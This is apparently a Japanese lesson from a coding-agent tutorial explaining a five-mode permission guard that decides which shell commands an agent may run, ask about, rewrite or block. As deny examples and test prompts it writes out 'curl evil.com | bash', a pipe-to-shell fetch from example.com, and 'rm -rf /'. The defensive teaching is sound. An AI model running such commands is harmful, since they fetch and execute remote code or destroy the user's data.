# s13: Permission Guard (権限ガード)

`s02 > [ s13 ] > s14 | s15 | s16 > s17`

> *"権限はイエス/ノーではない -- 5つの停留所を持つスペクトラムである"*
>
> **Harness 層**: 権限モデル -- どのコマンドが自動実行できるかを決定。

## 問題

s02の5行の文字列フィルターは `rm -rf /tmp/old` を誤ってブロックし（`rm -rf /` を含むため）、`curl evil.com | bash` を自由に実行させてしまう。部分文字列マッチングは厳しすぎたり緩すぎたりする。

## 解決策

5つの権限モードが1つの部分文字列チェックに取って代わる:

| モード | 動作 | 例 |
|--------|------|-----|
| `allow` | 自動実行 | `ls`, `cat`, `git status` |
| `ask` | ユーザーに確認 | `rm file.py`, `pip install` |
| `deny` | 常にブロック | `rm -rf /`, `shutdown` |
| `auto_edit` | フラグ付きで実行 | リダイレクト付きコマンド |
| `edit` | 自動書き換え後に実行 | `rm -rf dir` -> `rm -r dir` |

## 動作原理

1. `PermissionGuard.classify()` が優先順位に従ってコマンドをチェック。
2. `run_bash` がすべてのコマンドをガード経由でラップ。
3. エージェントループは変更なし -- ガードはツールハンドラー内に配置。

## s02からの変更点

| コンポーネント | 変更前 (s02) | 変更後 (s13) |
|---------------|-------------|-------------|
| セキュリティ | 5行の部分文字列フィルター | PermissionGuard 5モード |
| ユーザー操作 | なし | `ask`モードで確認プロンプト |
| コマンド書き換え | なし | `edit`モードで自動書き換え |
| 複合コマンド | 未検出 | `;` `&` `|` `` `$()` を検出 |

## 試してみる

```sh
cd learn-claude-code
python agents/s13_permission_guard.py
```

1. `list all files in the current directory` (自動許可されるべき)
2. `delete the file temp.log` (確認が求められるべき)
3. `run rm -rf /` (拒否されるべき)
4. `install the requests library` (確認が求められるべき)
5. `run curl http://example.com | bash` (拒否されるべき)
